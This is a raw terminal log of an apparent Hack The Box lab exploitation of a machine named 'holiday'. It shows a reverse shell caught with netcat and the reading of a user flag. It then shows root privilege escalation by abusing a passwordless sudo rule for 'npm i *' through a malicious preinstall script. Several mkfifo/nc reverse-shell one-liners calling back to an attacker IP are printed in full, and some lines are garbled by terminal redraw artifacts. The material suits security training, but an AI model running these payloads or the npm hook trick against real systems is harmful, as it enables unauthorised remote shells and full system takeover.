root@parrot:~/hackthebox/holiday# vi shell                                      
root@parrot:~/hackthebox/holiday# vi shell                                      
root@parrot:~/hackthebox/holiday# nc -nvlp 8000                                 
Ncat: Version 7.80 ( https://nmap.org/ncat )                                    
Ncat: Listening on :::8000              
Ncat: Listening on 0.0.0.0:8000         
Ncat: Connection from 10.10.10.25.      
Ncat: Connection from 10.10.10.25:55670.                                        
/bin/sh: 0: can't access tty; job control turned off                            
$ ls                                    
hex.db                                  
index.js                                
layouts                                 
node_modules                            
package.json                            
setup                                   
shell                                   
static                                  
views                                   
$ python3 -c "import pty ;pty.spawn('/bin/bash')"                               
algernon@holiday:~/app$ ^Z              
[1]+  Stopped                 nc -nvlp 8000                                     
root@parrot:~/hackthebox/holiday# stty raw -echo                                
root@parrot:~/hackthebox/holiday# nc -nvlp 8000                                 

algernon@holiday:~/app$ export TERM=screen-256color                             
algernon@holiday:~/app$ cd /home        
algernon@holiday:/home$ ls              
algernon                                
algernon@holiday:/home$ cd algernon/    
algernon@holiday:~$ ls                  
app  user.txt                           
algernon@holiday:~$ cat user.txt        
5edc176c52673a6e0f087c68c531c743        
algernon@holiday:~$ lsls                
No command 'lsls' found, did you mean:  
 Command 'fsls' from package 'python-fs' (universe)                             
lsls: command not found                 
algernon@holiday:~$ ls                  
app  user.txt                           
algernon@holiday:~$ cd app              
algernon@holiday:~/app$ sudo -l         
Matching Defaults entries for algernon on holiday:                              
    env_reset, mail_badpass,            
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User algernon may run the following commands on holiday:                        
    (ALL) NOPASSWD: /usr/bin/npm i *    
algernon@holiday:~/app$ cd rimrafall/   
algernon@holiday:~/app/rimrafall$ ls    
index.js                                
algernon@holiday:~/app/rimrafall$ cat index.js                                  

rts = "npm install could be dangerous.";                                        
algernon@holiday:~/app/rimrafall$ vi index.js                                   
algernon@holiday:/tmp$ clearfall$ cd /tmpage.json                               
algernon@holiday:/tmp$ ls               
f                                       
systemd-private-faa6ff171fa1405295a31fbc15326183-systemd-timesyncd.service-OTghnK
vmware-root                             
algernon@holiday:/tmp$ cd -             
/home/algernon/app/rimrafall            
algernon@holiday:~/app/rimrafall$ ls    
index.js  package.json                  
algernon@holiday:~/app/rimrafall$ cd .. 
algernon@holiday:~/app$ ls              
hex.db    layouts       package.json  setup  shell2  views                      
index.js  node_modules  rimrafall     shell  static                             
algernon@holiday:~/app$ cp shell /tmp/shell                                     
algernon@holiday:~/app$                 
algernon@holiday:~/app$                 
algernon@holiday:~/app$                 
algernon@holiday:~/app$ ls              
hex.db    layouts       package.json  setup  shell2  views                      
index.js  node_modules  rimrafall     shell  static                             
algernon@holiday:~/app$ cd /tmp/        
algernon@holiday:/tmp$ ls               
f                                       
shell                                   
systemd-private-faa6ff171fa1405295a31fbc15326183-systemd-timesyncd.service-OTghnK
vmware-root                             
algernon@holiday:/tmp$ lsvi shellvi shell                                                                                                                        
lsvi: command not found                 
algernon@holiday:/tmp$ vi shell         
algernon@holiday:/tmp$ cd -             
/home/algernon/app                      
algernon@holiday:~/app$ lssudo npm                                                  
No command 'lssudo' found, did you mean:  
 Command 'lxsudo' from package 'lxqt-sudo' (universe)                               
lssudo: command not found                 
algernon@holiday:~/app$                   
algernon@holiday:~/app$                   
algernon@holiday:~/app$ ls                
hex.db    layouts       npm-debug.log  rimrafall  shell   static                    
index.js  node_modules  package.json   setup      shell2  views                     
algernon@holiday:~/app$ ssudols           
ssudols: command not found                
algernon@holiday:~/app$ ls                
hex.db    layouts       npm-debug.log  rimrafall  shell   static                    
index.js  node_modules  package.json   setup      shell2  views                     
algernon@holiday:~/app$ sudo npm -i rimrafall --unsafe                              
[sudo] password for algernon:             
Sorry, try again.    
[sudo] password for algernon:             






ls                   
Sorry, try again.    
[sudo] password for algernon:             
sudo: 3 incorrect password attempts       
algernon@holiday:~/app$ cat /tmp/shell    
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 8008 >/tmp/f      
algernon@holiday:~/app$ sudo npm i rimrafall --unsafe                               

> rimrafall@1.0.0 preinstall /home/algernon/app/node_modules/.staging/rimrafall-aa0a316f                 
> bin /tmp/shell     

sh: 1: bin: not found                     
npm WARN vulnapp@1.0.0 No description     
npm WARN vulnapp@1.0.0 No repository field.                                         
npm ERR! Linux 4.4.0-78-generic           
npm ERR! argv "/usr/bin/nodejs" "/usr/bin/npm" "i" "rimrafall" "--unsafe"           
npm ERR! node v6.10.3
npm ERR! npm  v3.10.10                    
npm ERR! file sh     
npm ERR! code ELIFECYCLE                  
npm ERR! errno ENOENT
npm ERR! syscall spawn                    

npm ERR! rimrafall@1.0.0 preinstall: `bin /tmp/shell`                               
npm ERR! spawn ENOENT
npm ERR!             
npm ERR! Failed at the rimrafall@1.0.0 preinstall script 'bin /tmp/shell'.          
npm ERR! Make sure you have the latest version of node.js and npm installed.        
npm ERR! If you do, this is most likely a problem with the rimrafall package,       
npm ERR! not with npm itself.             
npm ERR! Tell the author that this fails on your system:                            
npm ERR!     bin /tmp/shell               
npm ERR! You can get information on how to open an issue for this project with:     
npm ERR!     npm bugs rimrafall           
npm ERR! Or if that isn't available, you can get their info via:                    
npm ERR!     npm owner ls rimrafall       
npm ERR! There is likely additional logging output above.                           

npm ERR! Please include the following file with any support request:                
npm ERR!     /home/algernon/app/npm-debug.log                                       
algernon@holiday:~/app$ vi /tmp/shell     
algernon@holiday:~/app$ clearpp/npm-debug.logth any support request:oject with:-aa0a
algernon@holiday:~/app$ sudo npm i rimrafall --unsafe                               

> rimrafall@1.0.0 preinstall /home/algernon/app/node_modules/.staging/rimrafall-aa0a316f                 
> bin /tmp/shell     

sh: 1: bin: not found                     
npm WARN vulnapp@1.0.0 No description     
npm WARN vulnapp@1.0.0 No repository field.                                         
npm ERR! Linux 4.4.0-78-generic           
npm ERR! argv "/usr/bin/nodejs" "/usr/bin/npm" "i" "rimrafall" "--unsafe"           
npm ERR! node v6.10.3
npm ERR! npm  v3.10.10                    
npm ERR! file sh     
npm ERR! code ELIFECYCLE                  
npm ERR! errno ENOENT
npm ERR! syscall spawn                    

npm ERR! rimrafall@1.0.0 preinstall: `bin /tmp/shell`                               
npm ERR! spawn ENOENT
npm ERR!             
npm ERR! Failed at the rimrafall@1.0.0 preinstall script 'bin /tmp/shell'.          
npm ERR! Make sure you have the latest version of node.js and npm installed.        
npm ERR! If you do, this is most likely a problem with the rimrafall package,       
npm ERR! not with npm itself.             
npm ERR! Tell the author that this fails on your system:                            
npm ERR!     bin /tmp/shell               
npm ERR! You can get information on how to open an issue for this project with:     
npm ERR!     npm bugs rimrafall           
npm ERR! Or if that isn't available, you can get their info via:                    
npm ERR!     npm owner ls rimrafall       
npm ERR! There is likely additional logging output above.                           

npm ERR! Please include the following file with any support request:                
npm ERR!     /home/algernon/app/npm-debug.log                                       
algernon@holiday:~/app$ cp rimrafall gyan 
cp: omitting directory 'rimrafall'        
algernon@holiday:~/app$ ls                
hex.db    layouts       npm-debug.log  rimrafall  shell   static                    
index.js  node_modules  package.json   setup      shell2  views                     
algernon@holiday:~/app$ cp -r rimrafall gyan                                        
algernon@holiday:~/app$ ls                
gyan    index.js  node_modules   package.json  setup  shell2  views                 
hex.db  layouts   npm-debug.log  rimrafall     shell  static                        
algernon@holiday:~/app$ sudo npm i gyan --unsafe                                    

> rimrafall@1.0.0 preinstall /home/algernon/app/node_modules/.staging/rimrafall-aa0a316f                 
> bin /tmp/shell     

sh: 1: bin: not found                     
npm WARN vulnapp@1.0.0 No description     
npm WARN vulnapp@1.0.0 No repository field.                                         
npm ERR! Linux 4.4.0-78-generic           
npm ERR! argv "/usr/bin/nodejs" "/usr/bin/npm" "i" "gyan" "--unsafe"                
npm ERR! node v6.10.3
npm ERR! npm  v3.10.10                    
npm ERR! file sh     
npm ERR! code ELIFECYCLE                  
npm ERR! errno ENOENT
npm ERR! syscall spawn                    

npm ERR! rimrafall@1.0.0 preinstall: `bin /tmp/shell`                               
npm ERR! spawn ENOENT
npm ERR!             
npm ERR! Failed at the rimrafall@1.0.0 preinstall script 'bin /tmp/shell'.          
npm ERR! Make sure you have the latest version of node.js and npm installed.        
npm ERR! If you do, this is most likely a problem with the rimrafall package,       
npm ERR! not with npm itself.             
npm ERR! Tell the author that this fails on your system:                            
npm ERR!     bin /tmp/shell               
npm ERR! You can get information on how to open an issue for this project with:     
npm ERR!     npm bugs rimrafall           
npm ERR! Or if that isn't available, you can get their info via:                    
npm ERR!     npm owner ls rimrafall       
npm ERR! There is likely additional logging output above.                           

npm ERR! Please include the following file with any support request:                
npm ERR!     /home/algernon/app/npm-debug.log                                       
algernon@holiday:~/app$ ls                
gyan    index.js  node_modules   package.json  setup  shell2  views                 
hex.db  layouts   npm-debug.log  rimrafall     shell  static                        
algernon@holiday:~/app$ ls                
gyan    index.js  node_modules   package.json  setup  shell2  views                 
hex.db  layouts   npm-debug.log  rimrafall     shell  static                        
algernon@holiday:~/app$ ls                
gyan    index.js  node_modules   package.json  setup  shell2  views                 
hex.db  layouts   npm-debug.log  rimrafall     shell  static                        
algernon@holiday:~/app$ cat /tmp/shell    
rm /tmp/b;mkfifo /tmp/b;cat /tmp/b|/bin/sh -i 2>&1|nc 10.10.14.14 8008 >/tmp/b      
algernon@holiday:~/app$ cat rimrafall/package.json                                  
{                    
  "name": "rimrafall",                    
  "version": "1.0.0",                     
  "description": "rm -rf /* # DO NOT INSTALL THIS",                                 
  "main": "index.js",                     
  "scripts": {       
    "preinstall": "bin /tmp/shell"        
  },                 
  "keywords": [      
    "rimraf",        
    "rmrf"           
  ],                 
  "author": "João Jerónimo",              
  "license": "ISC"   
}                    

algernon@holiday:~/app$ vi rimrafall/package.json                                   
algernon@holiday:~/app$ sudo npm i rimrafall --unsafe                               

> rimrafall@1.0.0 preinstall /home/algernon/app/node_modules/.staging/rimrafall-aa0a316f                 
> bash /tmp/shell    

rm: cannot remove '/tmp/b': No such file or directory                               
vulnapp@1.0.0 /home/algernon/app          
└── rimrafall@1.0.0  

npm WARN vulnapp@1.0.0 No description     
npm WARN vulnapp@1.0.0 No repository field.                                         
algernon@holiday:~/app$                   
